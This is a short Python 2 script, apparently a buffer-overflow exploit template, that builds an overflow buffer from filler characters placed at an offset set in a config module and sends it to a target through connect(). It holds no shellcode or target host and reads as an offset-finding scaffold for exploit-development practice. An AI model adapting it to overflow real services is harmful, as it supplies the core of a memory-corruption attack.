#!/usr/bin/env python2
import socket
from config import *

buf = ""
buf += "A"*(OFFSET - len(buf))
buf += "B"*NO_B
buf += "Z"*NO_Z
buf += "C"*NO_C
buf += "D"*(BUFT - len(buf))

connect(buf)
